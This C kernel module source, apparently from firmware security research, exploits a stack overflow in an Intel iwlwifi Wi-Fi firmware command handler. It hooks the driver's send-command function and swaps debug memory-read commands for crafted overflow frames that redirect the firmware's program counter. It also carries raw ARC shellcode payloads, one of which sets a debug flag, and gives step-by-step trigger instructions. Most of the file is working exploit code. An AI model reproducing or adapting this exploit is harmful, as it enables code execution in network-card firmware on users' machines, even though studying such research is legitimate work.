/*
Exploit for a vulnerability in a command handler called by the host (group: 0x00,
id: 0xf1).

There is a stack overflow in `sub_C0087A58`.

`sub_C008E160(void *dst, size_t count, int flag)` reads data from the CPU2 FIFO.
It is called twice:

- The first call reads `struct { size_t count; int flag }`.
- The second call reads `struct.count` bytes to the stack, there is no check on
  the given size.
 */

#include <linux/module.h>
#include <linux/kernel.h>

#include "exploit.h"
#include "nan.h"

#define IWL_MAX_CMD_TBS_PER_TFD	2
#define NAN_GROUP               0x7
#define TOF_GROUP               0x8
#define DEBUG_GROUP             0xf
#define DEBUG_MEM_OP_WRITE      1
#define TOF_RANGE_REQ_EXT_CMD   4
#define TOF_RANGE_RESPONDER_CONFIG   5
#define NVM_ACCESS_CMD          0x88
#define UMAC_RD_WR              1

#define CMD_ASYNC           BIT(0)
#define CMD_WANT_SKB        BIT(1)
#define CMD_SEND_IN_RFKILL  BIT(2)

#define VULN_CMD_ID   0xf1
#define TRIGGER_ADDR  0xc0a03108
#define TRIGGER_ADDR2 0xc0a03208
#define TARGET_PC     0x0100EB88
#define TRIGGER_ADDR_NAN 0xc0a03308
#define TRIGGER_ADDR_EEPROM 0xc0a03408

struct iwl_rx_packet;

struct iwl_host_cmd {
	const void *data[IWL_MAX_CMD_TBS_PER_TFD];
	struct iwl_rx_packet *resp_pkt;
	unsigned long _rx_page_addr;
	u32 _rx_page_order;

	u32 flags;
	u32 id;
	u16 len[IWL_MAX_CMD_TBS_PER_TFD];
	u8 dataflags[IWL_MAX_CMD_TBS_PER_TFD];
};

struct iwl_dbg_mem_access_cmd {
	__le32 op;
	__le32 addr;
	__le32 len;
	__le32 data[];
} __packed;

struct iwl_nvm_access_cmd {
	u8 op_code;
	u8 target;
	__le16 type;
	__le16 offset;
	__le16 length;
	u8 data[];
} __packed;

int (*real_iwl_mvm_send_cmd)(struct iwl_mvm *mvm, struct iwl_host_cmd *cmd);

static unsigned int hit = 0;

static void control_pc(struct iwl_host_cmd *hcmd, u8 *buf, size_t buf_size)
{
  u32 *p;
  size_t frame_size = 0x60 / sizeof(u32);

  if (buf_size < (frame_size + 1) * sizeof(u32)) {
    pr_info("invalid buf_size\n");
    return;
  }

  p = (u32 *)buf;

  /* blink */
  p[frame_size] = TARGET_PC;
  //p[frame_size] = 0xc0089524; /* this is the caller address */

  frame_size -= 1;

  p[0] = frame_size; // size of buffer to be read / 4
  p[1] = 0x8000000;  // some flag

  hcmd->id = VULN_CMD_ID;
  hcmd->data[0] = (void *)&buf[0];
  hcmd->len[0] = (2 + frame_size) * sizeof(u32);
}

/*
 * Put arbitrary data at a fixed address (0x0100EB88) using sub_1003384.
 *
 * sudo ./scripts/mem.py 0xC0A03208   # write payload
 * sudo ./scripts/mem.py 0x0100EB88   # optional: read payload and ensures that it's correct
 * sudo ./scripts/mem.py 0xC0A03108   # trigger vuln
 */
static void put_stuff_in_memory(struct iwl_host_cmd *hcmd, u8 *buf, size_t buf_size)
{
  u32 *header = (u32 *)&buf[0];
  u8 *p = &buf[8];
  size_t size;

#if 0
  /* payload which redirect execution to 0xc00802c4:
   *
   *   CF 70 08 C0 C4 02  mov_s   r0, 0xc00802c4
   *   00 78              j_s     [r0] */
  size = 8;
  memcpy(p, "\xcf\x70\x08\xc0\xc4\x02\x00\x78", size);
#elif 0
  /* payload which dumps the identity register into ADVANCED_SYSASSERT:
   *
   *   6A 20 00 01               lr      r0, IDENTITY
   *   20 20 80 0F 08 C0 94 4F   j        ADVANCED_SYSASSERT2_XXX */
  size = 12;
  memcpy(p, "\x6A\x20\x00\x01\x20\x20\x80\x0F\x08\xC0\x94\x4F", size);
#else
  /* payload which enable the "debug flag" (0xC0A03088 |= 0x400) and returns
   * correctly:
   *
   * CF 71 00 00 10 04  mov_s   r1, 0x410
   * CF 70 A0 C0 80 30  mov_s   r0, 0xC0A03080
   * 08 18 60 00        st.di   r1, [r0,8]
   * CF 70 08 C0 24 95  mov_s   r0, 0xC0089524
   * 00 78              j_s     [r0] */
  size = 16 + 8;
  memcpy(p,
         "\xCF\x71\x00\x00\x10\x04\xCF\x70\xA0\xC0\x80\x30\x08\x18\x60\x00"
         "\xcf\x70\x08\xc0\x24\x95\x00\x78",
         size);
#endif

  /* the cmd first read 2 int */
  header[0] = size;
  header[1] = 0;

  hcmd->id = (TOF_GROUP << 8) | TOF_RANGE_RESPONDER_CONFIG;
  hcmd->data[0] = (void *)&buf[0];
  hcmd->len[0] = sizeof(u32) * 2 + size;
}

static void trigger_nan(struct iwl_host_cmd *hcmd, u8 *buf, size_t buf_size)
{
  struct iwl_nan_cfg_cmd_v2 *cmd;

  hcmd->id = (NAN_GROUP << 8) | NAN_CONFIG_CMD;
  hcmd->data[0] = (void *)&buf[0];
  hcmd->len[0] = 4 * 0x1e;

  memset(buf, '\x00', buf_size);

  cmd = (struct iwl_nan_cfg_cmd_v2 *)buf;

  //memset(&cmd->umac_cfg, 0x01, sizeof(cmd->umac_cfg));
  //memset(&cmd->tb_cfg, 0x01, sizeof(cmd->tb_cfg));
  cmd->tb_cfg.chan24 = 0;
  cmd->tb_cfg.chan52 = 1;

  cmd->umac_cfg.action = FW_CTXT_ACTION_ADD;
  /**(short *)&buf[0x38] = 0x01;
  *(char *)&buf[0x14] = 0x01;
  *(char *)&buf[0x15] = 0x01;*/
  cmd->nan2_cfg.cdw = 0x02;
  //cmd->nan2_cfg.op_mode = 0x1;
  cmd->nan2_cfg.pot_avail_len = 0x01;
}

/* sudo cat /sys/kernel/debug/iwlwifi/0000:01:00.0/iwlmvm/nvm_sw | hd */
static void trigger_eeprom(struct iwl_host_cmd *hcmd, u8 *buf, size_t buf_size)
{
  struct iwl_nvm_access_cmd *cmd;

  hcmd->id = NVM_ACCESS_CMD;
  hcmd->data[0] = (void *)&buf[0];
  hcmd->len[0] = sizeof(struct iwl_nvm_access_cmd);

  memset(buf, '\x00', buf_size);

  cmd = (struct iwl_nvm_access_cmd *)buf;
  cmd->op_code = 0; /* IWL_NVM_READ */
	cmd->target = 0; /* NVM_ACCESS_TARGET_CACHE */
	cmd->type = cpu_to_le16(0); /* NVM_SECTION_TYPE_SW */
	cmd->offset = cpu_to_le16(0);
	cmd->length = cpu_to_le16(64);
}

/*
 * Replaces the legit command with a malicious one.
 */
int fh_iwl_mvm_send_cmd(struct iwl_mvm *mvm, struct iwl_host_cmd *hcmd)
{
  struct iwl_dbg_mem_access_cmd dbg_cmd;
  u8 group = (hcmd->id >> 8) & 0xff;
  u8 opcode = hcmd->id & 0xff;
  u8 buf[128];

  //pr_info("iwl_mvm_send_cmd hit: 0x%08x\n", hcmd->id);

  if (group == DEBUG_GROUP && opcode == UMAC_RD_WR) {
    memcpy(&dbg_cmd, hcmd->data[0], sizeof(dbg_cmd));
    pr_info("iwl_mvm_send_cmd hit: 0x%08x, addr=0x%08x, len=%d, %p, %d (hit: %d)\n",
            hcmd->id, dbg_cmd.addr, dbg_cmd.len, hcmd->data[0], hcmd->len[0], hit);
    if (dbg_cmd.op == DEBUG_MEM_OP_WRITE) {
      //pr_info("yeah\n");
      //read_instead_of_write(hcmd, buf, sizeof(buf));
    }
    if (dbg_cmd.addr == TRIGGER_ADDR) {
      /* Trigger the vuln on a memory read at TRIGGER_ADDR. */
      control_pc(hcmd, buf, sizeof(buf));
    } else if (dbg_cmd.addr == TRIGGER_ADDR2) {
      put_stuff_in_memory(hcmd, buf, sizeof(buf));
    } else if (dbg_cmd.addr == TRIGGER_ADDR_NAN) {
      trigger_nan(hcmd, buf, sizeof(buf));
    } else if (dbg_cmd.addr == TRIGGER_ADDR_EEPROM) {
      trigger_eeprom(hcmd, buf, sizeof(buf));
    }
  }

  return real_iwl_mvm_send_cmd(mvm, hcmd);
}
